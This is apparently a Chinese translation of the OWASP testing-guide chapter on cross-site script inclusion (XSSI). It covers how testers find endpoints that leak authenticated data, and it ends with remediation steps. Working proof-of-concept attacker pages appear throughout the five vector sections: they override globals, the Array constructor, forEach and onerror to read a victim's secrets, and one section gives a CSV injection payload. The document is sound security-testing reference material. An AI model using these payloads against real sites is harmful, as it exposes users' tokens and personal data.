# 测试跨站脚本包含

|ID          |
|------------|
|WSTG-CLNT-13|

## 概述

跨站脚本包含（XSSI）漏洞允许敏感数据跨源或跨域边界泄露。敏感数据可能包括认证相关数据（登录状态、Cookie、认证令牌、会话ID等）或用户的个人或敏感个人数据（电子邮件地址、电话号码、信用卡详细信息、社会安全号码等）。XSSI 是一种类似于跨站请求伪造（CSRF）的客户端攻击，但目的不同。CSRF 利用已认证的用户上下文在受害者页面内执行某些状态更改操作（例如将资金转入攻击者账户、修改权限、重置密码等），而 XSSI 则使用客户端 JavaScript 从已认证会话中泄露敏感数据。

默认情况下，网站仅允许访问来自同源的数据。这是一个关键的应用程序安全原则，受同源策略（由 [RFC 6454](https://tools.ietf.org/html/rfc6454) 定义）约束。来源被定义为 URI 方案（HTTP 或 HTTPS）、主机名和端口号的组合。然而，此策略不适用于 HTML `<script>` 标签包含。这种例外是必要的，否则网站将无法使用第三方服务、执行流量分析或使用广告平台等。

当浏览器打开包含 `<script>` 标签的网站时，资源会从跨源域获取。然后，这些资源在包含站点或浏览器的上下文中运行，这提供了泄露敏感数据的机会。在大多数情况下，这是通过 JavaScript 实现的，但脚本源不必是类型为 `text/javascript` 或扩展名为 `.js` 的 JavaScript 文件。

旧版浏览器（IE9/10）的漏洞允许在运行时通过 JavaScript 错误消息泄露数据，但这些漏洞现已被供应商修补，被认为不太相关。通过设置 `<script>` 标签的 charset 属性，攻击者或测试人员可以强制使用 UTF-16 编码，在某些情况下允许泄露其他数据格式（例如 JSON）的数据。有关这些攻击的更多信息，请参见[基于标识符的 XSSI 攻击](https://www.mbsd.jp/Whitepaper/xssi.pdf)。

## 测试目标

- 定位系统中的敏感数据。
- 通过多种技术评估敏感数据的泄露情况。

## 如何测试

### 使用已认证和未认证的用户会话收集数据

识别哪些端点负责发送敏感数据，需要哪些参数，并使用已认证的用户会话识别所有相关的动态和静态生成的 JavaScript 响应。特别注意使用 [JSONP](https://en.wikipedia.org/wiki/JSONP) 发送的敏感数据。要查找动态生成的 JavaScript 响应，生成已认证和未认证的请求，然后进行比较。如果它们不同，则表示响应是动态的；否则是静态的。为了简化此任务，可以使用诸如 [Veit Hailperin 的 Burp 代理插件](https://github.com/luh2/DetectDynamicJS)之类的工具。除了 JavaScript 之外，请确保检查其他文件类型；XSSI 不仅限于 JavaScript 文件。

### 确定敏感数据是否可以通过 JavaScript 泄露

测试人员应分析代码，查找以下通过 XSSI 漏洞泄露数据的载体：

1. 全局变量
2. 全局函数参数
3. 带引号窃取的 CSV（逗号分隔值）
4. JavaScript 运行时错误
5. 使用 `this` 的原型链

### 1. 通过全局变量泄露敏感数据

API 密钥存储在受害者网站 `victim.com` 上 URI 为 `https://victim.com/internal/api.js` 的 JavaScript 文件中，该文件仅对已认证用户可访问。攻击者配置一个网站 `attackingwebsite.com`，并使用 `<script>` 标签引用该 JavaScript 文件。

`https://victim.com/internal/api.js` 的内容如下：

```javascript
(function() {
  window.secret = "supersecretUserAPIkey";
})();
```

攻击站点 `attackingwebsite.com` 的 `index.html` 包含以下代码：

```html
<!DOCTYPE html>
<html>
  <head>
    <title>通过全局变量泄露数据</title>
  </head>
  <body>
    <h1>通过全局变量泄露数据</h1>
    <script src="https://victim.com/internal/api.js"></script>
    <div id="result">
    </div>
    <script>
      var div = document.getElementById("result");
      div.innerHTML = "您的秘密数据 <b>" + window.secret + "</b>";
    </script>
  </body>
</html>
```

在此示例中，受害者已通过 `victim.com` 认证。攻击者通过社会工程、钓鱼邮件等方式引诱受害者访问 `attackingwebsite.com`。受害者的浏览器随后获取 `api.js`，导致敏感数据通过全局 JavaScript 变量泄露并使用 `innerHTML` 显示。

### 2. 通过全局函数参数泄露敏感数据

此示例与前一个类似，不同之处在于 `attackingwebsite.com` 通过覆盖受害者的全局 JavaScript 函数，使用全局 JavaScript 函数来提取敏感数据。

`https://victim.com/internal/api.js` 的内容如下：

```javascript
(function() {
  var secret = "supersecretAPIkey";
  window.globalFunction(secret);
})();
```

攻击站点 `attackingwebsite.com` 的 `index.html` 包含以下代码：

```html
<!DOCTYPE html>
<html>
  <head>
    <title>通过全局函数参数泄露数据</title>
  </head>
  <body>
    <div id="result">
    </div>
    <script>
      function globalFunction(param) {
        var div = document.getElementById("result");
        div.innerHTML = "您的秘密数据：<b>" + param + "</b>";
      }
    </script>
    <script src="https://victim.com/internal/api.js"></script>
  </body>
</html>
```

还有其他 XSSI 漏洞可能导致通过 JavaScript 原型链或全局函数调用泄露敏感数据。有关这些攻击的更多信息，请参见[动态 JavaScript 的意外危险](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf)。

### 3. 通过带引号窃取的 CSV 泄露敏感数据

为了泄露数据，攻击者/测试人员必须能够将 JavaScript 代码注入 CSV 数据中。以下示例代码摘自 Takeshi Terada 的[基于标识符的 XSSI 攻击](https://www.mbsd.jp/Whitepaper/xssi.pdf)白皮书。

```text
HTTP/1.1 200 OK
Content-Type: text/csv
Content-Disposition: attachment; filename="a.csv"
Content-Length: xxxx

1,"___","aaa@a.example","03-0000-0001"
2,"foo","bbb@b.example","03-0000-0002"
...
98,"bar","yyy@example.net","03-0000-0088"
99,"___","zzz@example.com","03-0000-0099"
```

在此示例中，使用 `___` 列作为注入点，并在其位置插入 JavaScript 字符串，结果如下。

```text
1,"\"",$$$=function(){/*","aaa@a.example","03-0000-0001"
2,"foo","bbb@b.example","03-0000-0002"
...
98,"bar","yyy@example.net","03-0000-0088"
99,"*/}//","zzz@example.com","03-0000-0099"
```

[Jeremiah Grossman 在 2006 年撰写了关于 Gmail 中类似漏洞的文章](https://blog.jeremiahgrossman.com/2006/01/advanced-web-attack-techniques-using.html)，该漏洞允许以 JSON 格式提取用户联系人。在此情况下，数据从 Gmail 接收，并由浏览器 JavaScript 引擎使用未引用的 Array 构造函数进行解析以泄露数据。攻击者可以通过定义和覆盖内部 Array 构造函数来访问包含敏感数据的此 Array，如下所示：

```html
<!DOCTYPE html>
<html>
  <head>
    <title>通过 JSON 泄露 Gmail 联系人</title>
  </head>
  <body>
    <script>
      function Array() {
        // 窃取数据
      }
    </script>
    <script src="https://mail.google.com/mail/?_url_scrubbed_"></script>
  </body>
</html>
```

### 4. 通过 JavaScript 运行时错误泄露敏感数据

浏览器通常显示标准化的 [JavaScript 错误消息](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Errors)。然而，对于 IE9/10，运行时错误消息提供了可用于泄露数据的额外详细信息。例如，网站 `victim.com` 在 URI `https://victim.com/service/csvendpoint` 上为已认证用户提供以下内容：

```text
HTTP/1.1 200 OK
Content-Type: text/csv
Content-Disposition: attachment; filename="a.csv"
Content-Length: 13

1,abc,def,ghi
```

此漏洞可以通过以下方式利用：

```html
<!--错误处理程序 -->
<script>window.onerror = function(err) {alert(err)}</script>
<!--加载目标 CSV -->
<script src="https://victim.com/service/csvendpoint"></script>
```

当浏览器尝试将 CSV 内容作为 JavaScript 呈现时，它会失败并泄露敏感数据：

### 5. 通过使用 `this` 的原型链泄露敏感数据

在 JavaScript 中，`this` 关键字是动态作用域的。这意味着如果在一个对象上调用函数，`this` 将指向该对象，即使被调用的函数可能不属于该对象本身。此行为可用于泄露数据。在以下来自 [Sebastian Leike 演示页面](http://sebastian-lekies.de/leak/) 的示例中，敏感数据存储在 Array 中。攻击者可以用攻击者控制的函数覆盖 `Array.prototype.forEach`。如果某些代码在包含敏感值的数组实例上调用 `forEach` 函数，则攻击者控制的函数将被调用，且 `this` 指向包含敏感数据的对象。

以下是包含敏感数据的 JavaScript 文件 `javascript.js` 的摘录：

```javascript
...
(function() {
  var secret = ["578a8c7c0d8f34f5", "345a8b7c9d8e34f5"];

  secret.forEach(function(element) {
    // 在此执行某些操作
  });
})();
...
```

敏感数据可以通过以下 JavaScript 代码泄露：

```html
...
 <div id="result">

    </div>
    <script>
      Array.prototype.forEach = function(callback) {
        var resultString = "您的秘密值是：<b>";
        for (var i = 0, length = this.length; i < length; i++) {
          if (i > 0) {
            resultString += ", ";
          }
          resultString += this[i];
        }
        resultString += "</b>";
        var div = document.getElementById("result");
        div.innerHTML = resultString;
      };
    </script>
    <script src="https://victim.com/..../javascript.js"></script>
...
```


## 修复

- 使用带有适当 `charset` 属性的 `<script>` 标签。
- 验证和清理 JSONP 回调。
- 使用 CSRF 令牌来保护敏感端点。
- 避免在 JavaScript 响应中放置敏感数据。
- 使用 `HttpOnly` 和 `Secure` Cookie 标志。
- 实施严格的内容安全策略（CSP）。
- 使用 `X-Content-Type-Options: nosniff` 头部。
- 定期进行安全审查和更新。
